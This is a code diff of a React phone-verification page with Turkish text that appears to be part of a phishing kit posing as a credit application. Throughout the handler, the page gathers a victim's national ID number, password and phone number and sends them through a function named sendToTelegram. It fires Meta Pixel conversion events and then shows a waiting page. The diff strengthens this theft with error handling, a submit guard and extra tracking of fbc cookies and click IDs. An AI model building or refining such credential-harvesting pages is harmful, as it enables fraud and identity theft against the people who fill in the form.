@@ -1,4 +1,3 @@
-// eslint-disable-next-line no-unused-vars
 /* global fbq */
 import React, { useEffect, useRef, useCallback, memo } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
@@ -25,15 +24,39 @@ function PhoneVerificationPage() {
   const getFbp = () => {
     const cookies = document.cookie.split(';');
     const fbpCookie = cookies.find((c) => c.trim().startsWith('_fbp='));
-    return fbpCookie ? fbpCookie.split('=')[1] : null;
+    if (fbpCookie) {
+      const fbp = fbpCookie.split('=')[1];
+      // fbp formatı: fb.1.<timestamp>.<random>
+      if (/^fb\.1\.\d+\.\d+$/.test(fbp)) {
+        return fbp;
+      }
+    }
+    return undefined;
+  };
+
+  const getFbc = () => {
+    const cookies = document.cookie.split(';');
+    const fbcCookie = cookies.find((c) => c.trim().startsWith('_fbc='));
+    if (fbcCookie) {
+      const fbc = fbcCookie.split('=')[1];
+      return fbc;
+    }
+    const urlParams = new URLSearchParams(window.location.search);
+    const fbclid = urlParams.get('fbclid');
+    if (fbclid) {
+      return `fb.1.${Math.floor(Date.now() / 1000)}.${fbclid}`;
+    }
+    return undefined;
   };
 
   const trackMetaLead = useCallback(async (tc, phone, eventID) => {
     if (typeof window !== 'undefined' && window.fbq) {
       try {
-        window.fbq('track', 'Lead', {
-          content_category: 'lead_form',
-          content_name: 'phone_verification'
+        fbq('track', 'Lead', {
+          custom_data: {
+            content_category: 'lead_form',
+            content_name: 'phone_verification',
+          },
         }, { eventID });
         console.log('Meta Lead event tetiklendi:', { eventID: eventID.substring(0, 8) + '...' });
       } catch (error) {
@@ -67,12 +90,9 @@ function PhoneVerificationPage() {
 
   useEffect(() => {
     if (typeof window !== 'undefined' && window.fbq) {
-      window.fbq('track', 'ViewContent', {
+      fbq('track', 'ViewContent', {
         content_category: 'credit_form',
         content_name: 'phone_verification_page',
-      });
-      window.fbq('track', 'InitiateCheckout', {
-        content_category: 'credit_form_start',
       });
     }
   }, []);
@@ -88,20 +108,26 @@ function PhoneVerificationPage() {
           phone: String(data.phone),
           eventID: data.eventID,
           fbp: data.fbp,
-          clickID: data.clickID,
+          fbc: data.fbc,
         }),
       });
       const result = await res.json();
       if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
       return result;
     } catch (error) {
-      console.error('API hatası:', error);
+      console.error('API hatası:', error.message);
+      setState((prev) => ({
+        ...prev,
+        showPhoneError: true,
+        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
+      }));
       return { error: error.message };
     }
   }, []);
 
   const handlePhoneSubmit = useCallback(async (e) => {
     e.preventDefault();
+    if (state.isSubmitting) return; // Double submit guard
     if (state.phoneNumber.length !== 10) {
       setState((prev) => ({
         ...prev,
@@ -110,35 +136,42 @@ function PhoneVerificationPage() {
       }));
       return;
     }
+    if (typeof window !== 'undefined' && window.fbq) {
+      try {
+        fbq('track', 'InitiateCheckout', {
+          content_category: 'credit_form_start',
+        });
+      } catch (error) {
+        console.error('Meta InitiateCheckout event hatası:', error);
+      }
+    }
     setState((prev) => ({ ...prev, isSubmitting: true }));
     const eventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-    const clickID = (() => {
-      const searchParams = new URLSearchParams(location.search);
-      return searchParams.get('fbclid') || '';
-    })();
     await trackMetaLead(tc, state.phoneNumber, eventID);
-    await sendToTelegram({
+    const result = await sendToTelegram({
       tc,
       password,
       phone: state.phoneNumber,
       eventID,
       fbp: getFbp(),
-      clickID,
+      fbc: getFbc(),
     });
-    authDispatch({ type: 'RESET_AUTH' });
-    setState({
-      phoneNumber: '',
-      isPhoneActive: false,
-      isPhoneLabelHovered: false,
-      showPhoneError: false,
-      isSubmitting: false,
-      isPhoneFocused: false,
-      isPhonePrefixVisible: false,
-      errorMessage: '',
-    });
-    window.history.replaceState(null, '', '/bekleme');
-    navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
-  }, [tc, password, navigate, authDispatch, trackMetaLead, sendToTelegram, state.phoneNumber, location.search]);
+    if (result && !result.error) {
+      authDispatch({ type: 'RESET_AUTH' });
+      setState({
+        phoneNumber: '',
+        isPhoneActive: false,
+        isPhoneLabelHovered: false,
+        showPhoneError: false,
+        isSubmitting: false,
+        isPhoneFocused: false,
+        isPhonePrefixVisible: false,
+        errorMessage: '',
+      });
+      window.history.replaceState(null, '', '/bekleme');
+      navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
+    }
+  }, [state.phoneNumber, state.isSubmitting, sendToTelegram, tc, password, navigate, authDispatch, trackMetaLead]);
 
   const handleNumberInput = useCallback((e) => {
     const value = e.target.value.replace(/[^0-9]/g, '');
@@ -198,9 +231,7 @@ function PhoneVerificationPage() {
         </div>
         <div className="input-wrapper">
           <div
-            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
-              state.isPhonePrefixVisible ? 'prefix-visible' : ''
-            }`}
+            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${state.isPhonePrefixVisible ? 'prefix-visible' : ''}`}
             onClick={() => phoneInputRef.current?.focus()}
           >
             <label
